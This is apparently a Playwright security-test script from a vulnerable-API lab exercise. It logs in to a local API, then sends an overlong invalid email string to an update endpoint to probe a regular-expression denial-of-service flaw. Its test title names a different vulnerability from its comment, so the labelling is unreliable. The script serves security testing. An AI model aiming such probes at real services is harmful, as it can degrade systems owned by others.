
// Kịch bản 7: Khai thác lỗ hổng Regular Expression

import { test, expect } from '@playwright/test';
import { PlaywrightTestConfig } from '@playwright/test';

test('Exploiting the Broken object property level authorization', async ({ request }) => {
    const login = await request.post(`/users/v1/login`, {
      data: {
        username: 'thieuhoa',
        password: 'test1'
      },
    });
    expect(login.ok()).toBeTruthy();
    const token = await login.json()
    let accessToken = token.auth_token
    const config: PlaywrightTestConfig = {
      use: {
        baseURL: 'http://localhost:5002',
        extraHTTPHeaders: {
          Authorization: `Bearer ${accessToken}`
        },
      },
    };

    await test.step("Update email with long string", async () => {
        const updateEmail = await request.put(`/users/v1/thieuhoa/email`, {
            headers:{
                Authorization: `Bearer ${accessToken}`
            },
            data: {
                email: 'any_invalid_string_not_email_the_longer_the_worse',

            }
        });    
        expect(updateEmail.status()).toBe(200);
        console.log(await updateEmail.json());
    });
})  


